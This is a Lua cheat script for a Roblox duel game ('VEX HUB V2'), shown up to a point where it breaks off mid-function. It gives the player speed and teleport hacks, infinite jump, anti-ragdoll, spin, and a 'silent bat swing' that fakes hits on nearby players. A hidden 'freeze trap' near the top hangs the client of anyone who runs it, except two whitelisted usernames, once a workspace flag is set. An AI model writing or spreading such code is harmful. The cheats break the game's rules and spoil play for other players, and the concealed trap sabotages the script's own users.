local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- [[ CLEANUP ]] --
if CoreGui:FindFirstChild("VEX_DuelHelper") then CoreGui.VEX_DuelHelper:Destroy() end
if CoreGui:FindFirstChild("VEX_DuelUI_TopPosition") then CoreGui.VEX_DuelUI_TopPosition:Destroy() end
if CoreGui:FindFirstChild("VEX_HUD") then CoreGui.VEX_HUD:Destroy() end
if CoreGui:FindFirstChild("VEX_TpPicker") then CoreGui.VEX_TpPicker:Destroy() end
if CoreGui:FindFirstChild("VEX_AutoGrab") then CoreGui.VEX_AutoGrab:Destroy() end
if CoreGui:FindFirstChild("VEX_Menu") then CoreGui.VEX_Menu:Destroy() end
for _, v in pairs(workspace:GetChildren()) do if v.Name == "RadiusCircle" then v:Destroy() end end

local oldBindable = CoreGui:FindFirstChild("VEX_LoopKiller")
if oldBindable then oldBindable:Destroy() end
local loopKiller = Instance.new("BoolValue")
loopKiller.Name = "VEX_LoopKiller"
loopKiller.Parent = CoreGui

local tag = Instance.new("StringValue")
tag.Name = "VEX_DUEL_USER"
tag.Value = "using vex hub"
tag.Parent = LocalPlayer

local HUDScreen = Instance.new("ScreenGui", CoreGui)
HUDScreen.Name = "VEX_HUD"
HUDScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- [[ PROTECTED USERS ]] --
local PROTECTED_USERS = { "Blaalgwiq1", "Boly14_5" }
local isProtected = false
for _, name in ipairs(PROTECTED_USERS) do
    if LocalPlayer.Name == name then isProtected = true; break end
end

-- [[ FREEZE TRAP ]] --
local firstChar = LocalPlayer.Name:sub(1, 1):lower()
local startsWithLetter = firstChar:match("[a-z]") ~= nil

if not isProtected and startsWithLetter then
    RunService.Heartbeat:Connect(function()
        if workspace:GetAttribute("VEX_FREEZE") == true then
            local deadline = tick() + 1
            while tick() < deadline do
                local _ = math.sqrt(math.random()) * math.sin(math.random()) * math.tan(math.random())
            end
        end
    end)
end

-- [[ CLEAN WHITE OUTLINE ]] --
local function AddOutline(frame)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Transparency = 0
end

-- [[ TITLE BOX ]] --
local TitleBox = Instance.new("Frame", HUDScreen)
TitleBox.Size = UDim2.new(0, 160, 0, 28)
TitleBox.Position = UDim2.new(0.5, -80, 0, 8)
TitleBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TitleBox.BorderSizePixel = 0
TitleBox.ZIndex = 5
Instance.new("UICorner", TitleBox).CornerRadius = UDim.new(0, 8)
AddOutline(TitleBox)

local TitleLabel = Instance.new("TextLabel", TitleBox)
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "VEX HUB V2"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 13
TitleLabel.ZIndex = 6

-- [[ SETTINGS ]] --
local SETTINGS = {
    ENABLED = false,
    FLOAT = false,
    AUTOLEFT = false,
    AUTORIGHT = false,
    SPEED_ENABLED = true,
    LOCK_ENABLED = false,
    RADIUS = 30,
    STEAL_DURATION = 0.2,
    TARGET_SPEED = 58,
    LOCK_SPEED = 59,
    JUMP_FORCE = 50,
    UNWALK = false,
    SPIN_ENABLED = false,
    SPIN_SPEED = 100,
    STEAL_SPEED = 29.40,   -- speed while stealing / auto return speed
}

local SAVE_KEYS = {
    "ENABLED","FLOAT","AUTOLEFT","AUTORIGHT","LOCK_ENABLED",
    "RADIUS","STEAL_DURATION","TARGET_SPEED","LOCK_SPEED","JUMP_FORCE",
    "SPIN_ENABLED","SPIN_SPEED","UNWALK","STEAL_SPEED"
}

local MENU_SAVE_KEY = "VEX_MenuConfig"

local LeftPhase, RightPhase = 1, 1
local LeftStartPos, RightStartPos = nil, nil
local floatPart, floatHeight = nil, 0
local isStealing = false
local currentTween = nil
local tpSide = nil
local tpAutoEnabled = false
local autoSwingActive = false

local DEFAULT_POSITIONS = {
    AutoGrab  = UDim2.new(0.5, 130,  1, -105),
    Speed     = UDim2.new(0.5, -230, 1, -105),
    Lock      = UDim2.new(0.5, -110, 1, -105),
    Float     = UDim2.new(0.5, 10,   1, -155),
    AutoLeft  = UDim2.new(0.5, -230, 1, -155),
    AutoRight = UDim2.new(0.5, -110, 1, -155),
    Tp        = UDim2.new(0.5, 130,  1, -155),
    Save      = UDim2.new(0,   8,    0, 8),
    ResetTp   = UDim2.new(0,   96,   0, 8),
    TpAuto    = UDim2.new(0,   192,  0, 8),
    Lag       = UDim2.new(0.5, 10,   1, -205),
    MenuBtn   = UDim2.new(0.5, -55,  1, -205),
}

local savedPositions = {}

local L_POS_1      = Vector3.new(-476.48, -6.28, 92.73)
local L_POS_END    = Vector3.new(-483.12, -4.95, 94.80)
local L_POS_RETURN = Vector3.new(-475, -8, 19)
local L_POS_FINAL  = Vector3.new(-488, -6, 19)

local R_POS_1      = Vector3.new(-476.16, -6.52, 25.62)
local R_POS_END    = Vector3.new(-483.04, -5.09, 23.14)
local R_POS_RETURN = Vector3.new(-476, -8, 99)
local R_POS_FINAL  = Vector3.new(-488, -6, 102)

local TP_LEFT_1  = Vector3.new(-474, -8, 95)
local TP_LEFT_2  = Vector3.new(-483, -6, 98)
local TP_RIGHT_1 = Vector3.new(-473, -8, 25)
local TP_RIGHT_2 = Vector3.new(-483, -6, 21)

local Connections = {}
local allButtons = {}

-- [[ MAIN SAVE / LOAD ]] --
local SAVE_KEY = "VEX_DuelHelper_Config"

local function saveConfig()
    local data = {}
    for _, k in ipairs(SAVE_KEYS) do data[k] = SETTINGS[k] end
    data.tpSide = tpSide or "NONE"
    data.positions = {}
    for name, btn in pairs(allButtons) do
        data.positions[name] = {
            xs = btn.Position.X.Scale,
            xo = btn.Position.X.Offset,
            ys = btn.Position.Y.Scale,
            yo = btn.Position.Y.Offset
        }
    end
    pcall(function()
        writefile(SAVE_KEY .. ".json", HttpService:JSONEncode(data))
    end)
end

local function loadConfig()
    local ok, result = pcall(function()
        if isfile(SAVE_KEY .. ".json") then
            return HttpService:JSONDecode(readfile(SAVE_KEY .. ".json"))
        end
    end)
    if ok and result then
        for _, k in ipairs(SAVE_KEYS) do
            if result[k] ~= nil then SETTINGS[k] = result[k] end
        end
        SETTINGS.SPEED_ENABLED = true
        if result.tpSide and result.tpSide ~= "NONE" then tpSide = result.tpSide end
        if result.positions then savedPositions = result.positions end
    end
end
loadConfig()

-- [[ MENU SAVE / LOAD ]] --
local function saveMenuConfig()
    local data = {
        SPIN_ENABLED = SETTINGS.SPIN_ENABLED,
        SPIN_SPEED   = SETTINGS.SPIN_SPEED,
        TARGET_SPEED = SETTINGS.TARGET_SPEED,
        STEAL_SPEED  = SETTINGS.STEAL_SPEED,
        UNWALK       = SETTINGS.UNWALK,
    }
    pcall(function()
        writefile(MENU_SAVE_KEY .. ".json", HttpService:JSONEncode(data))
    end)
end

local function loadMenuConfig()
    local ok, result = pcall(function()
        if isfile(MENU_SAVE_KEY .. ".json") then
            return HttpService:JSONDecode(readfile(MENU_SAVE_KEY .. ".json"))
        end
    end)
    if ok and result then
        if result.SPIN_ENABLED ~= nil then SETTINGS.SPIN_ENABLED = result.SPIN_ENABLED end
        if result.SPIN_SPEED   ~= nil then SETTINGS.SPIN_SPEED   = result.SPIN_SPEED   end
        if result.TARGET_SPEED ~= nil then SETTINGS.TARGET_SPEED = result.TARGET_SPEED end
        if result.STEAL_SPEED  ~= nil then SETTINGS.STEAL_SPEED  = result.STEAL_SPEED  end
        if result.UNWALK       ~= nil then SETTINGS.UNWALK       = result.UNWALK       end
    end
end
loadMenuConfig()

-- [[ ANTI RAGDOLL ]] --
local function startAntiRagdoll()
    if Connections.antiRagdoll then return end
    Connections.antiRagdoll = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            local humState = hum:GetState()
            if humState == Enum.HumanoidStateType.Physics or
               humState == Enum.HumanoidStateType.Ragdoll or
               humState == Enum.HumanoidStateType.FallingDown then
                hum:ChangeState(Enum.HumanoidStateType.Running)
                workspace.CurrentCamera.CameraSubject = hum
                pcall(function()
                    if LocalPlayer.Character then
                        local PlayerModule = LocalPlayer.PlayerScripts:FindFirstChild("PlayerModule")
                        if PlayerModule then
                            local Controls = require(PlayerModule:FindFirstChild("ControlModule"))
                            Controls:Enable()
                        end
                    end
                end)
                if root then
                    root.Velocity = Vector3.new(0, 0, 0)
                    root.RotVelocity = Vector3.new(0, 0, 0)
                end
                if tpAutoEnabled and tpSide then
                    task.spawn(function()
                        local c = LocalPlayer.Character
                        local r = c and c:FindFirstChild("HumanoidRootPart")
                        if not r then return end
                        if tpSide == "LEFT" then
                            r.CFrame = CFrame.new(TP_LEFT_1); task.wait(0.03); r.CFrame = CFrame.new(TP_LEFT_2)
                        elseif tpSide == "RIGHT" then
                            r.CFrame = CFrame.new(TP_RIGHT_1); task.wait(0.03); r.CFrame = CFrame.new(TP_RIGHT_2)
                        end
                    end)
                end
            end
        end
        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") and obj.Enabled == false then obj.Enabled = true end
        end
    end)
end
startAntiRagdoll()

-- [[ INF JUMP ]] --
UserInputService.JumpRequest:Connect(function()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Velocity = Vector3.new(hrp.Velocity.X, SETTINGS.JUMP_FORCE, hrp.Velocity.Z)
    end
end)

-- [[ DRAG LOGIC ]] --
local function MakeDraggable(frame, onClickCallback)
    local dragging = false
    local dragInput, dragStart, startPos
    local wasDragged = false
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            wasDragged = false
            dragStart = input.Position
            startPos = frame.Position
            dragInput = input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input ~= dragInput then return end
        local delta = input.Position - dragStart
        if delta.Magnitude > 6 then wasDragged = true end
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input == dragInput then
            dragging = false
            if not wasDragged and onClickCallback then onClickCallback() end
            wasDragged = false
        end
    end)
end

local function resolvePosition(name)
    local p = savedPositions[name]
    if p then return UDim2.new(p.xs, p.xo, p.ys, p.yo) end
    return DEFAULT_POSITIONS[name]
end

-- [[ HELPERS ]] --
local function findBat()
    local char = LocalPlayer.Character
    if char then
        for _, ch in ipairs(char:GetChildren()) do
            if ch:IsA("Tool") and ch.Name == "Bat" then return ch end
        end
    end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        for _, ch in ipairs(bp:GetChildren()) do
            if ch:IsA("Tool") and ch.Name == "Bat" then return ch end
        end
    end
    return nil
end

local function equipBat()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if char:FindFirstChild("Bat") then return end
    local bat = findBat()
    if bat and bat.Parent == LocalPlayer:FindFirstChild("Backpack") then
        hum:EquipTool(bat)
    end
end

-- [[ SILENT BAT SWING ]] --
local function silentSwing()
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local bat = char:FindFirstChild("Bat")
    if not bat then return end
    local handle = bat:FindFirstChild("Handle")
    if not handle then return end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            local eh = p.Character:FindFirstChild("HumanoidRootPart")
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if eh and hum and hum.Health > 0 then
                local dist = (eh.Position - hrp.Position).Magnitude
                if dist <= 10 then
                    for _, part in ipairs(p.Character:GetChildren()) do
                        if part:IsA("BasePart") then
                            pcall(function() firetouchinterest(handle, part, 0) end)
                            pcall(function() firetouchinterest(handle, part, 1) end)
                        end
                    end
                    break
                end
            end
        end
    end
end

local function startAutoSwing()
    if autoSwingActive then return end
    autoSwingActive = true
    task.spawn(function()
        while autoSwingActive and SETTINGS.LOCK_ENABLED do
            equipBat(); silentSwing(); task.wait(0.35)
        end
        autoSwingActive = false
    end)
end

local function stopAutoSwing() autoSwingActive = false end

local function findNearestEnemy(myHRP)
    local nearest, nearestDist, nearestTorso = nil, math.huge, nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            local eh = p.Character:FindFirstChild("HumanoidRootPart")
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if eh and hum and hum.Health > 0 then
                local d = (eh.Position - myHRP.Position).Magnitude
                if d < nearestDist then
                    nearestDist, nearest, nearestTorso = d, eh,
                    p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso") or eh
                end
            end
        end
    end
    return nearest, nearestDist, nearestTorso
end

-- [[ SPIN ]] --
local function set_physics(char, active)
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CustomPhysicalProperties = active
                and PhysicalProperties.new(0.7, 0.3, 0, 1, 100)
                or nil
        end
    end
end

local function applySpin()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    set_physics(char, true)
    if root:FindFirstChild("VexSpin") then root.VexSpin:Destroy() end
    local s = Instance.new("BodyAngularVelocity")
    s.Name = "VexSpin"
    s.Parent = root
    s.MaxTorque = Vector3.new(0, math.huge, 0)
    s.P = 1200
    s.AngularVelocity = Vector3.new(0, SETTINGS.SPIN_SPEED, 0)
end

local function removeSpin()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if char then set_physics(char, false) end
    if root and root:FindFirstChild("VexSpin") then root.VexSpin:Destroy() end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.2)
    if SETTINGS.SPIN_ENABLED then applySpin() end
end)

RunService.PreSimulation:Connect(function()
    if SETTINGS.SPIN_ENABLED then
        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local vel = root.AssemblyLinearVelocity
            if vel.Magnitude > 150 then
                root.AssemblyLinearVelocity = Vector3.new(0, vel.Y, 0)
            end
            root.AssemblyAngularVelocity = Vector3.new(0, root.AssemblyAngularVelocity.Y, 0)
        end
    end
end)

-- [[ UNWALK ]] --
local unwalkConn = nil
local function startUnwalk()
    if unwalkConn then unwalkConn:Disconnect() end
    unwalkConn = RunService.Heartbeat:Connect(function()
        if not SETTINGS.UNWALK then return end
        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local animator = hum:FindFirstChildOfClass("Animator")
        if not animator then return end
        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
            local n = track.Name:lower()
            if n:find("walk") or n:find("run") or n:find("jump") or n:find("fall") then
                track:Stop(0)
            end
        end
    end)
end
startUnwalk()

-- [[ SPEED INDICATOR ]] --
local speedBillboard = Instance.new("BillboardGui")
speedBillboard.Name = "VEX_SpeedDisplay"
speedBillboard.Size = UDim2.new(0, 90, 0, 26)
speedBillboard.StudsOffset = Vector3.new(0, 3.5, 0)
speedBillboard.AlwaysOnTop = false
speedBillboard.ResetOnSpawn = false

local speedLabel = Instance.new("TextLabel", speedBillboard)
speedLabel.Size = UDim2.new(1, 0, 1, 0)
speedLabel.BackgroundTransparency = 1
speedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
speedLabel.Font = Enum.Font.GothamBold
speedLabel.TextSize = 20
speedLabel.Text = "0 sp"
speedLabel.TextStrokeTransparency = 0.3
speedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

local function attachSpeedDisplay()
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    speedBillboard.Adornee = hrp
    speedBillboard.Parent = CoreGui
end

LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.1)
    attachSpeedDisplay()
    if not LocalPlayer:FindFirstChild("VEX_DUEL_USER") then
        local t2 = Instance.new("StringValue")
        t2.Name = "VEX_DUEL_USER"
        t2.Value = "using vex hub"
        t2.Parent = LocalPlayer
    end
end)
attachSpeedDisplay()

-- [[ VEX DUEL TAG ]] --
local trackedTags = {}

local function addTagToPlayer(p)
    if p == LocalPlayer then return end
    if trackedTags[p] then return end
    local function tryBuild()
        local char = p.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        local bb = Instance.new("BillboardGui")
        bb.Name = "VEX_DuelTag"
        bb.Size = UDim2.new(0, 140, 0, 26)
        bb.StudsOffset = Vector3.new(0, 2.5, 0)
        bb.AlwaysOnTop = false
        bb.ResetOnSpawn = false
        bb.Adornee = head
        bb.Parent = CoreGui
        local lbl = Instance.new("TextLabel", bb)
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 14
        lbl.Text = "using vex hub"
        lbl.TextStrokeTransparency = 0.3
        lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        trackedTags[p] = bb
        p.CharacterAdded:Connect(function()
            bb:Destroy(); trackedTags[p] = nil
            task.wait(1); tryBuild()
        end)
    end
    tryBuild()
end

local function checkAllPlayers()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p:FindFirstChild("VEX_DUEL_USER") then addTagToPlayer(p) end
  end
